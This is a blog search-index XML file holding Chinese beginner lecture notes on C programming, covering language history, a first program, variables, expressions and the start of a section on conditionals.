<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1.2 C语言</title>
    <url>/C%E8%AF%AD%E8%A8%80/c453971c.html</url>
    <content><![CDATA[<h3 id="为什么是C？"><a href="#为什么是C？" class="headerlink" title="为什么是C？"></a>为什么是C？</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.2-001.png" alt="为什么是C"></p><h3 id="其他语言？"><a href="#其他语言？" class="headerlink" title="其他语言？"></a>其他语言？</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.2-002.png" alt="其他语言"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.2-003.png" alt="其他语言"></p><h3 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h3><ul><li>C语言是从B语言发展而来的，B语言是从BCPL发展而来的，BCPL是从 FORTRAN发展而来的</li><li>BCPL和B都⽀支持指针间接方式，所以C也支持了</li><li>C语言还受到了PL/1的影响，还和PDP-11的机器语言有很大的关系</li><li>1973年3月，第三版的Unix上出现了C语言的编译器</li><li>1973年11月，第四版的Unix（System Four）发布了，这个版本是完全用C语言重新写的</li></ul><h3 id="C的发展与版本-K-amp-R"><a href="#C的发展与版本-K-amp-R" class="headerlink" title="C的发展与版本-K&amp;R"></a>C的发展与版本-K&amp;R</h3><ul><li>经典 C又被叫做 “K&amp;R the C”</li><li>The C Programming Language, by Brian Kernighan and Dennis Ritchie, 2nd Edition,Prentice Hall</li></ul><h3 id="C的发展与版本-标准"><a href="#C的发展与版本-标准" class="headerlink" title="C的发展与版本-标准"></a>C的发展与版本-标准</h3><ul><li>1989年ANSI发布了一个标准——ANSI C</li><li>1990年ISO接受了ANSI的标准——C89</li><li>C的标准在1995年和1999年两次更新——C95和C99</li><li>所有的当代编译器都支持C99了</li></ul><h3 id="C语言用在哪里？"><a href="#C语言用在哪里？" class="headerlink" title="C语言用在哪里？"></a>C语言用在哪里？</h3><ul><li>操作系统</li><li>嵌入式系统</li><li>驱动程序</li><li>底层驱动</li><li>图形引擎、图像处理、声音效果</li></ul><h3 id="C是一种工业语言"><a href="#C是一种工业语言" class="headerlink" title="C是一种工业语言"></a>C是一种工业语言</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.2-004.png" alt="C是一种工业语言"></p><h3 id="编译—-gt-运行"><a href="#编译—-gt-运行" class="headerlink" title="编译—&gt;运行"></a>编译—&gt;运行</h3><ul><li>C需要被编译才能运行，所以你需要</li><li>编辑器</li><li>编译器</li><li>或者，IDE（集成开发环境）</li></ul><h3 id="推荐的编程软件"><a href="#推荐的编程软件" class="headerlink" title="推荐的编程软件"></a>推荐的编程软件</h3><ul><li>Dev C++（4.9 for Win7, 5.0 for Win8）</li><li>免费</li><li>安装简单</li><li>不用建工程</li></ul><h3 id="其他选择"><a href="#其他选择" class="headerlink" title="其他选择"></a>其他选择</h3><ul><li>MS Visual Studio Express（Windows）</li><li>Xcode（Mac OS X）</li><li>Eclipse-CDT</li><li>Geany（和MinGW一起）</li><li>Sublime（和MinGW一起）</li><li>vim/emacs（和MinGW一起）</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>1.3 第一个C程序</title>
    <url>/C%E8%AF%AD%E8%A8%80/bf1319ec.html</url>
    <content><![CDATA[<h3 id="初学C的困惑"><a href="#初学C的困惑" class="headerlink" title="初学C的困惑"></a>初学C的困惑</h3><ul><li>用什么软件好？</li><li>选择太多有时候是个麻烦</li><li>当代语言往往只有一个编程软件可用</li><li>那就Dev C++ 5.6.3吧！</li></ul><h3 id="第一个C程序"><a href="#第一个C程序" class="headerlink" title="第一个C程序"></a>第一个C程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在Dev-C-里"><a href="#在Dev-C-里" class="headerlink" title="在Dev C++里"></a>在Dev C++里</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.3-001.png" alt="在Dev C++里"></p><h3 id="程序框架"><a href="#程序框架" class="headerlink" title="程序框架"></a>程序框架</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.3-002.png" alt="在Dev C++里"></p><ul><li>本课程中所有的程序都需要这一段</li><li>直到学函数之前，我们的代码都只是在这个框架中间</li></ul><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li>printf(“Hello World!\n”);</li><li>&quot;&quot;里面的内容叫做“字符串”，printf会把其中的内容原封不动地输出</li><li>\n表示需要在输出的结果后面换一行</li></ul><h3 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h3><ul><li>如果你在使用Dev C++ 4.9.9.2</li><li>system(“pause”);</li><li>让程序运行完成后，窗口还能留下</li><li>不是Dev C++ 4.9.9.2就不需要这个了</li></ul><h3 id="程序中的错误"><a href="#程序中的错误" class="headerlink" title="程序中的错误"></a>程序中的错误</h3><ul><li>编译的时候发现的错误所在的地方会以红色的底表示出来</li><li>具体的错误原因列在下方的窗口里（是英文的）</li><li>C的编译器给出的错误提示往往不那么好“猜”</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.3-003.png" alt="程序中的错误"></p><h3 id="不要用中文！！！"><a href="#不要用中文！！！" class="headerlink" title="不要用中文！！！"></a>不要用中文！！！</h3><p>中国学生还有一个极其常见的低级错误，就是用了中文输入法来输入程序。那些标点符号，在中文和英文可能看上去相似，但是对于计算<br>机是完全不同的符号，如果你还开了全角标点的话，问题就更严重了。</p><h3 id="做计算"><a href="#做计算" class="headerlink" title="做计算"></a>做计算</h3><ul><li>printf(“%d\n”, 23+43);</li><li>%d说明后面有一个整数要输出在这个位置上</li><li>printf(“23+43=%d\n”, 23+43);</li></ul><h3 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.3-004.png" alt="四则运算"></p><blockquote><p>%表示取两个数相除以后的余数</p></blockquote><h3 id="第一周的练习"><a href="#第一周的练习" class="headerlink" title="第一周的练习"></a>第一周的练习</h3><ul><li>在自己的计算机上安装好编程的软件</li><li>依次下载/拷贝课程网站上的四个程序</li><li>编译并运行</li><li>结果如何</li><li>有没有问题—&gt;来讨论区讨论吧！</li><li>尝试理解</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>1.1 计算机和编程语言</title>
    <url>/C%E8%AF%AD%E8%A8%80/3ecb78ee.html</url>
    <content><![CDATA[<h3 id="计算机是生活必需品"><a href="#计算机是生活必需品" class="headerlink" title="计算机是生活必需品"></a>计算机是生活必需品</h3><p>如果想要自己设计一些功能和行为，让计算机按照你的意图做事情，就需要写程序了</p><p>本课程的主要的目的是通过学习编程，来理解计算机是如何解决问题的，理解计算机的能与不能，擅长与非擅长</p><h3 id="计算机如何解决问题"><a href="#计算机如何解决问题" class="headerlink" title="计算机如何解决问题"></a>计算机如何解决问题</h3><p>“请给我一杯水”</p><ol><li>转身走到厨房；</li><li>找到一个杯子；</li><li>找到一个水壶；</li><li>在杯子中倒入一些水；</li><li>拿着杯子走回桌子。</li></ol><p>人：What to do<br>计算机：How to do</p><h3 id="计算机语言"><a href="#计算机语言" class="headerlink" title="计算机语言"></a>计算机语言</h3><p>程序是用特殊的编程语言写出来表达如何解决问题的</p><p>不是用编程语言来和计算机交谈，而是描述要求它如何做事情的过程或方法</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.1-001.png" alt="计算机的语言"></p><h3 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.1-002.png" alt="辗转相除法"></p><h3 id="计算机-程序-算法"><a href="#计算机-程序-算法" class="headerlink" title="计算机-程序-算法"></a>计算机-程序-算法</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/1.1-003.png" alt="辗转相除法"></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>我们要让计算机做计算,就需要像这样找出计算的步骤,然后用编程语言写出来<br>计算机做的所有的事情都叫做计算</p><h3 id="计算机的思维"><a href="#计算机的思维" class="headerlink" title="计算机的思维"></a>计算机的思维</h3><p>2x+6=20<br>解方程<br>枚举<br>二分搜索</p><h3 id="枚举求最大公约数"><a href="#枚举求最大公约数" class="headerlink" title="枚举求最大公约数"></a>枚举求最大公约数</h3><ol><li>设t为2；</li><li>如果u和v都能被t整除，则记下这个t</li><li>t加1后重复第2步，直到t等于u或v；</li><li>那么，曾经记下的最大的可以同时整除u和v的t就是gcd</li></ol><h3 id="程序的执行"><a href="#程序的执行" class="headerlink" title="程序的执行"></a>程序的执行</h3><p>解释：借助一个程序，那个程序能试图理解你的程序，然后按照你的要求执行<br>编译：借助一个程序，就像一个翻译，把你的程序翻译成计算机真正能懂的语言——机器语言——写的程<br>序，然后，这个机器语言写的程序就能直接执行了</p><h3 id="解释语言vs编译语言"><a href="#解释语言vs编译语言" class="headerlink" title="解释语言vs编译语言"></a>解释语言vs编译语言</h3><ul><li>语言本无编译/解释之分</li><li>常用的执行方式而已</li><li>解释型语言有特殊的计算能力</li><li>编译型语言有确定的运算性能</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>2.1 变量</title>
    <url>/C%E8%AF%AD%E8%A8%80/e1581616.html</url>
    <content><![CDATA[<h3 id="做计算"><a href="#做计算" class="headerlink" title="做计算"></a>做计算</h3><blockquote><p>printf(“23+43=%d\n, 23+43”);</p></blockquote><h3 id="算找零"><a href="#算找零" class="headerlink" title="算找零"></a>算找零</h3><blockquote><p>printf(“23+43=%d\n, 23+43”);</p><p>printf(“100-23=%d\n, 100-23”);</p></blockquote><ul><li>如何能在程序运行时输入那个数字23，然后计算输出结果?</li></ul><p>需要：</p><ol><li>有地方放输入的数字；</li><li>有办法输入数字；</li><li>输入的数字能参与计算。</li></ol><h3 id="change-c"><a href="#change-c" class="headerlink" title="change.c"></a>change.c</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> price = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入金额(元):"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;price);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> change = <span class="number">100</span> - price;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"找您%d元。\n"</span>, change);</span><br></pre></td></tr></table></figure><h3 id="如何输入"><a href="#如何输入" class="headerlink" title="如何输入"></a>如何输入</h3><ul><li>输入也在终端窗口中</li><li>输入是以行为单位进行的，行的结束标志就是你按下了回车键。在你按下回车之前，你的程序不会读到任何东西</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-001.bmp" alt="change.c"></p><ul><li>int price = 0;</li><li>这一行，定义了一个变量。变量的名字是price，类型是int，初始值是0。</li><li>变量是一个保存数据的地方，当我们需要在程序里保存数据时，比如上面的例子中要记录用户输入的价格，就需要一个变量来保存它。用一个变量保存了数据，它才能参加到后面的计算中，比如计算找零。</li></ul><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><ul><li>变量定义的一般形式就是：</li><li>&lt;类型名称&gt; &lt;变量名称&gt;;</li><li>int price;</li><li>int amount;</li><li>int price, amount;</li></ul><h3 id="变量的名字"><a href="#变量的名字" class="headerlink" title="变量的名字"></a>变量的名字</h3><ul><li>变量需要一个名字，变量的名字是一种“标识符”，意思是它是用来识别这个和那个的不同的名字。</li><li>标识符有标识符的构造规则。基本的原则是：标识符只能由字母、数字和下划线组成，数字不可以出现在第一个位置上，C语言的关键字（有的地方叫它们保留字）不可以用做标识符。</li></ul><h3 id="C语言的保留字"><a href="#C语言的保留字" class="headerlink" title="C语言的保留字"></a>C语言的保留字</h3><blockquote><p>auto,break,case,char,const,continue,default,do,double,<br>else,enum,extern,float,for,goto,if,int,long,register,return,<br>short,signed,sizeof,static,struct,switch,typedef,union,<br>unsigned,void,volatile,while,inline,restrict</p></blockquote><h3 id="赋值和初始化"><a href="#赋值和初始化" class="headerlink" title="赋值和初始化"></a>赋值和初始化</h3><ul><li>int price = 0;</li><li>这一行，定义了一个变量。变量的名字是price，类型是int，初始值是0。</li><li>price=0是一个式子，这里的“＝”是一个赋值运算符，表示将“＝”右边的值赋给左边的变量。</li></ul><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>和数学不同，a=b在数学中表示关系，即a和b的值一样；而在程序设计中，a=b表示要求计算机做一个动作：将b的值赋给a。关系是静态的，而动作是动态的。在数学中，a=b和b=a是等价的，而在程序设计中，两者的意思完全相反</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul><li>当赋值发生在定义变量的时候，就像程序1中的第7行那样，就是变量的初始化。虽然C语言并没有强制要求所有的变量都在定义的地方做初始化，但是所有的变量在第一次被使用（出现在赋值运算符的右边）之前被应该赋值一次</li><li>如果没有初始化？</li></ul><h3 id="变量初始化"><a href="#变量初始化" class="headerlink" title="变量初始化"></a>变量初始化</h3><ul><li>&lt;类型名称&gt; &lt;变量名称&gt; = &lt;初始值&gt;;</li><li>int price = 0;</li><li>int amount = 100;</li><li>组合变量定义的时候，也可以在这个定义中单独给单个变量赋初值，如：</li><li>int price = 0, amount = 100;</li></ul><h3 id="读整数"><a href="#读整数" class="headerlink" title="读整数"></a>读整数</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-001.png" alt="change.c"></p><ul><li>scanf(“%d”, &amp;price);</li><li>要求scnaf这个函数读入下一个整数，读到的结果赋值给变量price</li><li>小心price前面的&amp;</li><li>如果输入的不是整数会怎样？</li></ul><h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><ul><li>“＝”是赋值运算符，有运算符的式子就叫做表达式。</li><li>price=0;</li><li>change=100-price;</li></ul><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-001.png" alt="change.c"></p><ul><li>int price = 0;</li><li>这一行，定义了一个变量。变量的名字是price，类型是int，初始值是0。</li><li>C是一种有类型的语言，所有的变量在使用之前必须定义或声明，所有的变量必须具有确定的数据类型。数据类型表示在变量中可以存放什么样的数据，变量中只能存放指定类型的数据，程序运行过程中也不能改变变量的类型。</li></ul><h3 id="第二个变量"><a href="#第二个变量" class="headerlink" title="第二个变量"></a>第二个变量</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-001.png" alt="change.c"></p><ul><li>int change = 100 - price;</li><li>定义了第二个变量change</li><li>并且做了计算</li></ul><h3 id="ANSI-C"><a href="#ANSI-C" class="headerlink" title="ANSI C"></a>ANSI C</h3><ul><li>只能在代码开头的地方定义变量</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-002.png" alt="ANSI C"></p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ul><li>int change = 100 - price;</li><li>固定不变的数，是常数。直接写在程序里，我们称作直接量（literal）。</li><li>更好的方式，是定义一个常量：</li><li>const int AMOUNT = 100;</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-003.png" alt="常量"></p><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><ul><li>const是一个修饰符，加在int的前面，用来给这个变量加上一个const（不变的）的属性。这个const的属性表示这个变量的值一旦初始化，就不能再修改了。</li><li>int change = AMOUNT - price;</li><li>如果你试图对常量做修改，把它放在赋值运算符的左边，就会被编译器发现，指出为一个错误。</li></ul><h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><ul><li>让用户输入变量AMOUNT的值，而不是使用固定的初始值</li><li>这个变量在哪里定义合适呢？</li></ul><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul><li>程序要求读入多个数字时，可以在一行输入，中间⽤用空格分开，也可以在多行输入</li><li>在scanf的格式字符串中有几个%d，它就等待用户输入一个整数，当然，字符串后面也需要对应有那么多个整数</li></ul><h3 id="plus-c"><a href="#plus-c" class="headerlink" title="plus.c"></a>plus.c</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-002.bmp" alt="常量"></p><h3 id="计算身高的程序"><a href="#计算身高的程序" class="headerlink" title="计算身高的程序"></a>计算身高的程序</h3><ul><li>美国人固执地使用英制计量单位，他们习惯用几尺几寸（英尺英寸）来报自己的身高。如果遇到一个美国人告诉你他是5英尺7，他的身高应该是一米几呢？</li><li>(5 + 7 ÷ 12 ) × 0.3048 = 1.7018米</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-004.png" alt="计算身高的程序"></p><h3 id="运行一下"><a href="#运行一下" class="headerlink" title="运行一下"></a>运行一下</h3><ul><li>为什么总是1.524米？</li><li>因为两个整数的运算的结果只能是整数</li><li>10/3*3=&gt;?</li><li>10和10.0在C中是完全不同的数</li><li>10.0是浮点数</li></ul><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p>带小数点的数值。浮点这个词的本意就是指小数点是浮动的，是计算机内部表达非整数（包含分数和⽆无理数）的一种方式。另一种方式叫做定点数，不过在C语言中你不会遇到定点数。人们借用浮点数这个词来表达所有的带小数点的数。</p><h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><ul><li>(foot + inch / 12) * 0.3048;</li><li>(foot + inch / 12.0) * 0.3048;</li><li>当浮点数和整数放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算。</li></ul><h3 id="double"><a href="#double" class="headerlink" title="double"></a>double</h3><ul><li>inch是定义为int类型的变量，如果把int换成double，我们就把它改为double类型的浮点数变量了。</li><li>double的意思是“双”，它本来是“双精度浮点数”的第一个单词，人们用来表示浮点数类型。除了double，还有float（意思就是浮点！）表示单精度浮点数。</li></ul><p>另一个版本</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.1-005.png" alt="计算身高的程序"></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">整数</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,…)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,…)</span><br><span class="line">带小数点的数</span><br><span class="line"><span class="keyword">double</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f"</span>,…)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>,…)</span><br></pre></td></tr></table></figure><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>整数类型不能表达有小数部分的数，整数和整数的运算结果还是整数。计算机里会有纯粹的整数这种奇怪的东西，是因为整数的运算比较快，而且占地方也小。其实人们日常生活中大量做的还是纯粹整数的计算，所以整数的用处还是很大的。</p>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>2.2 表达式</title>
    <url>/C%E8%AF%AD%E8%A8%80/c453971c.html</url>
    <content><![CDATA[<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><p>一个表达式是一系列运算符和算子的组合，用来计算一个值</p><p>amount = x * (1 + 0.033) * (10.033) * (1 + 0.033);<br>total = 57;<br>count = count + 1;<br>value = (min / 2) * lastValue;</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>运算符（operator）是指进行运算的动作，比如加法运算符“+”，减法运算符“-”。</li><li>算子（operand）是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-001.png" alt="运算符"></p><h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><ul><li>result = 12 + 6 / 2;</li><li>result = (12 + 6) / 2;</li><li>result = 4 * ((12 – 4) / 2);</li></ul><h3 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-002.png" alt="四则运算"></p><h3 id="计算时间差"><a href="#计算时间差" class="headerlink" title="计算时间差"></a>计算时间差</h3><p>输入两个时间，每个时间分别输入小时和分钟的值，然后输出两个时间之间的差，也以几小时几分表示</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-003.png" alt="计算时间差"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-001.bmp" alt="计算时间差"></p><ul><li>hour1*60+minute1—&gt;转换为分钟为单位</li><li>t/60—&gt;小时部分；t%60—&gt;分钟</li></ul><h3 id="求平均值"><a href="#求平均值" class="headerlink" title="求平均值"></a>求平均值</h3><p>写一个程序，输入两个整数，输出它们的平均值</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-002.bmp" alt="求平均值"></p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-004.png" alt="运算符优先级"></p><h3 id="单目运算符"><a href="#单目运算符" class="headerlink" title="单目运算符"></a>单目运算符</h3><ul><li>只有一个算子的运算符：+、-</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">-20</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, a * - b);</span><br></pre></td></tr></table></figure><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><ul><li>赋值也是运算，也有结果</li><li>a=6的结果是a被赋予的值，也就是6</li><li>a=b=6 —&gt; a=(b=6)</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-005.png" alt="嵌入式赋值"></p><h3 id="结合关系"><a href="#结合关系" class="headerlink" title="结合关系"></a>结合关系</h3><p>表达式太复杂，不容易阅读和理解，容易造成读程序时的误解。所以，要避免写出这样的<br>复杂表达式来的。这个表达式应该被拆成若干个表达式，然后以明显的正确的顺序来进行计算。</p><p>result = a = b = 3 + c;<br>result = 2;<br>result = (result = result * 2) * 6 * (result = 3 + result);</p><h3 id="计算复利"><a href="#计算复利" class="headerlink" title="计算复利"></a>计算复利</h3><ul><li>在银行存定期的时候，可以选择到期后自动转存，并将到期的利息计入本金合并转<br>存。如果1年期的定期利率是3.3%，那么连续自动转存3年后，最初存入的x元定期<br>会得到多少本息余额？</li><li>本息合计 ＝ x(1+3.3%)3</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line"><span class="keyword">double</span> amount = x * (<span class="number">1</span> + <span class="number">0.033</span>) * (<span class="number">1</span> + <span class="number">0.033</span>) *</span><br><span class="line">(<span class="number">1</span> + <span class="number">0.033</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f"</span>, amount);</span><br></pre></td></tr></table></figure><h3 id="交换两个变量"><a href="#交换两个变量" class="headerlink" title="交换两个变量"></a>交换两个变量</h3><ul><li>如果已经有：<br>int a = 6;<br>int b = 5;<br>如何交换a、b两个变量的值？</li></ul><h3 id="程序是按步执行的"><a href="#程序是按步执行的" class="headerlink" title="程序是按步执行的"></a>程序是按步执行的</h3><ul><li>程序表达的是顺序执行的动作，而不是关系<br>a=b;<br>b=a;<br>是依次执行的，结果使得a和b都得到b原来的值</li></ul><h3 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> t = a;</span><br><span class="line">a = b;</span><br><span class="line">b = t;</span><br></pre></td></tr></table></figure><h3 id="复合赋值"><a href="#复合赋值" class="headerlink" title="复合赋值"></a>复合赋值</h3><ul><li><p>5个算术运算符，+ - * / %，可以和赋值运算符“=”结合起来，形成复合赋值运算符<br>：“+=”、“-=”、“*=”、“/=”和“%=”</p></li><li><p>total += 5;</p></li><li><p>total = total + 5;</p></li><li><p>注意两个运算符中间不要有空格</p></li><li><p>total += (sum+100)/2;</p></li><li><p>total = total + (sum+100)/2;</p></li><li><p>total * = sum+12;</p></li><li><p>total = total*(sum+12);</p></li><li><p>total /= 12+6;</p></li><li><p>total = total / (12+6);</p></li></ul><h3 id="递增递减运算符"><a href="#递增递减运算符" class="headerlink" title="递增递减运算符"></a>递增递减运算符</h3><ul><li>“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量。<br>这两个运算符分别叫做递增和递减运算符，他们的作用就是给这个变量+1或者-1。</li><li>count++;</li><li>count += 1;</li><li>count = count + 1;</li></ul><h3 id="前缀后缀"><a href="#前缀后缀" class="headerlink" title="前缀后缀"></a>前缀后缀</h3><ul><li>++和–可以放在变量的前⾯面，叫做前缀形式，也可以放在变量的后面，叫做后缀形<br>式。</li><li>a++的值是a加1以前的值，而++a的值是加了1以后的值，无论哪个，a自己的值都加<br>了1了。</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/2.2-006.png" alt="前缀后缀"></p><h3 id="–"><a href="#–" class="headerlink" title="++–"></a>++–</h3><ul><li>这两个运算符有其历史来源</li><li>可以单独使用，但是不要组合进表达式</li><li>++i++ –&gt;?</li><li>i++++ —&gt;?</li><li>a = b+=c++-d+–e/-f</li></ul>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>3.1 判断</title>
    <url>/C%E8%AF%AD%E8%A8%80/8ba2c3e8.html</url>
    <content><![CDATA[<h3 id="计算时间差"><a href="#计算时间差" class="headerlink" title="计算时间差"></a>计算时间差</h3><ul><li><p>输入两个时间，每个时间分别输入小时和分钟的值，然后输出两个时间之间的差，也以几小时几分表示</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-001.png" alt="计算时间差"></p></li></ul><h3 id="如果"><a href="#如果" class="headerlink" title="如果"></a>如果</h3><ul><li>就用分别减的方案，然后判断有没有出现借位行不行？</li><li>借位的表现是，分钟减的结果小于0</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> im = minute2 - minute1;</span><br><span class="line"><span class="keyword">if</span> ( im &lt;<span class="number">0</span> ) &#123;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-001.bmp" alt="计算时间差"></p><ul><li>如果</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( 条件成立 ) &#123;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>计算两个值之间的关系，所以叫做关系运算</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-002.png" alt="条件"></p><h3 id="关系运算的结果"><a href="#关系运算的结果" class="headerlink" title="关系运算的结果"></a>关系运算的结果</h3><ul><li>当两个值的关系符合关系运算符的预期时，关系运算的结果为整数1，否则为整数0</li><li>printf(“%d\n”, 5==3);</li><li>printf(“%d\n”, 5&gt;3);</li><li>printf(“%d\n”, 5&lt;=3);</li></ul><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><ul><li><p>所有的关系运算符的优先级比算术运算的低，但是比赋值运算的高</p></li><li><p>7 &gt;= 3 + 4</p></li><li><p>int r = a&gt;0;</p></li><li><p>判断是否相等的==和!＝的优先级比其他的低，而连续的关系运算是从左到右进行的</p></li><li><p>5 &gt; 3 == 6 &gt; 4</p></li><li><p>6 &gt; 5 &gt; 4</p></li><li><p>a == b == 6</p></li><li><p>a == b &gt; 0</p></li></ul><h3 id="找零计算器"><a href="#找零计算器" class="headerlink" title="找零计算器"></a>找零计算器</h3><p>找零计算器需要用户做两个操作：输入购买的金额，输入支付的票面，而找零计算<br>器则根据用户的输入做出相应的动作：计算并打印找零，或告知用户余额不足以购<br>买。<br>从计算机程序的角度看，这就是意味着程序需要读用户的两个输入，然后进行一些计算和判断，最后输出结果。</p><p><img src="/images/c%E8%AF%AD%E8%A8%80/3.1-003.png" alt="找零计算器"></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ul><li>以两个斜杠“//”开头的语句把程序分成了三个部分：</li></ul><ol><li>初始化</li><li>读入金额和票面</li><li>计算并打印找零</li></ol><ul><li>注释（comment）插入在程序代码中，用来向读者提供解释信息。它们对于程序的功能没有任何影响，但是往往能使得程序更容易被人类读者理解。</li></ul><h3 id="注释-1"><a href="#注释-1" class="headerlink" title="/* */注释"></a>/* 